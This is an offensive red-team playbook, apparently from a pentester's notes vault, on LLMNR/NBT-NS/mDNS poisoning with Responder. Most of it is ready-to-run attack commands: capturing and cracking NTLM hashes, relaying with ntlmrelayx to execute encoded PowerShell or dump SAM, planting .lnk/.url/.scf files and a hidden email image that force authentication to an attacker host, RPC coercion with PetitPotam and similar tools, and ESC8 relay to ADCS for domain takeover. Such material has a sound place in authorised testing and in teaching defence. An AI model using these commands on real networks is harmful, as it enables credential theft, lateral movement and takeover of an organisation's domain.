## Responder & LLMNR/NBT-NS Poisoning

Capturing NTLM hashes by poisoning name resolution protocols on the local network. When a Windows host can't resolve a name via DNS, it falls back to broadcast protocols — an attacker on the same subnet can respond and capture credentials.

---

### How It Works

1. Victim tries to access `\\fileserverr\share` (typo or stale mapping)
2. DNS fails to resolve `fileserverr`
3. Windows falls back to:
   - **LLMNR** (Link-Local Multicast Name Resolution) — multicast on port 5355
   - **NBT-NS** (NetBIOS Name Service) — broadcast on port 137
   - **mDNS** (Multicast DNS) — multicast on port 5353
4. Attacker responds: "That's me!"
5. Victim authenticates to attacker — NTLM challenge/response captured
6. Hash is cracked offline or relayed to another service

---

### Responder

[Responder](https://github.com/lgandx/Responder) — the standard tool for LLMNR/NBT-NS/mDNS poisoning and credential capture.

#### Basic Capture

```sh
# Start Responder on the internal interface
sudo responder -I eth0

# With WPAD poisoning (captures HTTP auth from proxy auto-config)
sudo responder -I eth0 -wF

# Verbose mode
sudo responder -I eth0 -v

# Captured hashes are saved to:
# /usr/share/responder/logs/
# Format: <protocol>-NTLMv2-<ip>.txt
```

#### Analyse Mode (Passive)

Listen without poisoning — useful for recon and deconfliction.

```sh
# Passive mode — observe but don't respond
sudo responder -I eth0 -A
```

> [!Important]
> Run in analyse mode first to understand the environment. Aggressive poisoning in a production network can break legitimate name resolution and cause service disruptions.

#### Configuration

```sh
# Edit Responder config
sudo vim /usr/share/responder/Responder.conf

# Key settings:
# SQL = On/Off          — MS-SQL authentication server
# SMB = On/Off          — SMB authentication server
# HTTP = On/Off         — HTTP authentication server
# HTTPS = On/Off        — HTTPS authentication server
# WPAD = On/Off         — WPAD proxy authentication
# ProxyAuth = On/Off    — Force proxy authentication
```

> [!Warning]
> If you plan to **relay** captured auth instead of cracking it, **disable SMB and HTTP** in Responder config. Otherwise Responder will grab the hash and the relay won't get it.

---

### Cracking Captured Hashes

```sh
# NTLMv2 (most common)
hashcat -a 0 -m 5600 hashes.txt wordlist.txt
hashcat -a 0 -m 5600 hashes.txt wordlist.txt -r rules/best64.rule

# NTLMv1 (rare — older systems, but easier to crack)
hashcat -a 0 -m 5500 hashes.txt wordlist.txt

# John
john --format=netntlmv2 --wordlist=wordlist.txt hashes.txt
```

> NTLMv2 is a challenge-response hash — it cannot be passed (PTH). It must be cracked to plaintext or relayed.

---

### NTLM Relay (Instead of Cracking)

Instead of cracking the captured hash, relay the authentication to another service in real-time. Requires SMB signing to be disabled on the target.

```sh
# 1. Disable SMB and HTTP in Responder.conf (so relay gets the auth)
# SQL = On, SMB = Off, HTTP = Off

# 2. Start ntlmrelayx targeting a list of hosts
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Relay and execute a command
sudo ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell -enc <BASE64>'

# Relay and dump SAM
sudo ntlmrelayx.py -tf targets.txt -smb2support --sam

# Relay to LDAP (for RBCD, Shadow Credentials, etc.)
sudo ntlmrelayx.py -t ldap://<dc> --delegate-access

# 3. Start Responder (without SMB/HTTP)
sudo responder -I eth0
```

#### Finding Relay Targets (SMB Signing Disabled)

```sh
# nxc — check SMB signing across subnet
nxc smb <subnet>/24 --gen-relay-list targets.txt

# nmap
nmap --script smb2-security-mode -p 445 <subnet>/24
```

> [!Important]
> You cannot relay authentication back to the originating host. The relay target must be a different machine where the captured user has admin access.

---

### Forcing Authentication

Don't wait for natural poisoning — actively trigger NTLM auth from specific targets.

#### File-Based Triggers

```powershell
# Shortcut (.lnk) with UNC icon path — triggers when folder is browsed
$wsh = New-Object -ComObject wscript.shell
$lnk = $wsh.CreateShortcut("\\<share>\software\@inventory.lnk")
$lnk.IconLocation = "\\<attacker>\test.ico"
$lnk.Save()

# URL file — same trigger
# @inventory.url
[InternetShortcut]
URL=placeholder
IconIndex=0
IconFile=\\<attacker>\icon.ico

# SCF file (Shell Command File) — auto-triggers in Explorer
# @inventory.scf
[Shell]
Command=2
IconFile=\\<attacker>\icon.ico
```

> Name files with `@` prefix so they sort to the top of directory listings — increases chance of triggering.

#### Email-Based Triggers

```html
<!-- 1x1 invisible image in HTML email body -->
<img src="\\<attacker>\image.png" height="1" width="1" />

<!-- Or modify a user's email signature after compromise -->
```

#### RPC-Based Coercion

```sh
# SpoolSample / PrinterBug (MS-RPRN)
execute-assembly SpoolSample.exe <target> <attacker>

# PetitPotam (MS-EFSRPC)
python3 PetitPotam.py <attacker> <target>

# DFSCoerce (MS-DFSNM)
python3 DFSCoerce.py -u <user> -p <password> -d <domain> <attacker> <target>

# Coercer (tries multiple methods)
python3 coercer.py -u <user> -p <password> -d <domain> -l <attacker> -t <target>
```

---

### Multi-Relay to ADCS (ESC8)

Combine coercion with relay to ADCS HTTP enrollment for certificate-based takeover.

```sh
# 1. Relay to ADCS web enrollment
sudo ntlmrelayx.py -t http://<adcs_host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Coerce DC authentication
python3 PetitPotam.py <attacker> <dc>

# 3. Use the captured certificate
# See: [[5. Domain Takeover/g. ADCS Abuse]] — NTLM Relaying to ADCS
```

---

### WPAD Poisoning

WPAD (Web Proxy Auto-Discovery) allows Responder to inject a rogue proxy configuration. Browsers/apps configured for "auto-detect proxy" will authenticate.

```sh
# Enable WPAD + Force WPAD auth
sudo responder -I eth0 -wF

# -w : Start WPAD rogue proxy
# -F : Force NTLM authentication on WPAD (vs basic auth)
```

> WPAD is most effective in environments where browsers use "Automatically detect settings" (common in enterprise).

---

> [!Note]
> **OPSEC:**
> - Responder poisoning can disrupt legitimate name resolution — start with analyse mode (`-A`)
> - Poisoning generates abnormal traffic patterns on multicast/broadcast — detectable by network monitoring
> - Captured NTLMv2 hashes include timestamp and are single-use for relay — time-sensitive
> - WPAD poisoning can break internet access if the rogue proxy config is malformed
> - Defenders: disable LLMNR (GPO) and NBT-NS (network adapter settings) to eliminate this attack surface

---

> See also: [[5. Domain Takeover/c. Lateral Movement & Pivoting]] (NTLM Relay chain with PortBender), [[5. Domain Takeover/g. ADCS Abuse]] (ESC8 relay)
